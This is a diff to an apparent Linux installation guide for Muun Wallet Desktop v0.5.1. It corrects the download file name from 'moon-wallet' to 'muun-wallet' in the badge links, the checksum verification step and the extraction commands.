@@ -1,6 +1,6 @@
-[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
+﻿[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
 
-[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)
 
 ---
 
@@ -20,18 +20,18 @@ Muun Wallet Desktop v0.5.1 is distributed for Linux as a self-contained `.zip` a
 
 ## Step 1: Download and verify
 
-Download `moon-wallet-v0.5.1.zip` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip).
+Download `muun-wallet-v0.5.1.zip` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip).
 
 Verify the SHA-256 checksum before extracting:
 
 ```bash
-sha256sum ~/Downloads/moon-wallet-v0.5.1.zip
+sha256sum ~/Downloads/muun-wallet-v0.5.1.zip
 ```
 
 Expected output:
 
 ```
-60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01  moon-wallet-v0.5.1.zip
+60617914e65bd3035467867502e078cc01a381ee8ee3b58cb328ff29228bdb01  muun-wallet-v0.5.1.zip
 ```
 
 If the hash does not match, delete the file and re-download from the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1). See the [download verification guide](how-to-verify-muun-wallet-download.md) for more context on why this step matters.
@@ -44,7 +44,7 @@ Create a directory and extract the archive into it:
 
 ```bash
 mkdir -p ~/Applications/muun-wallet
-unzip ~/Downloads/moon-wallet-v0.5.1.zip -d ~/Applications/muun-wallet
+unzip ~/Downloads/muun-wallet-v0.5.1.zip -d ~/Applications/muun-wallet
 ```
 
 ---
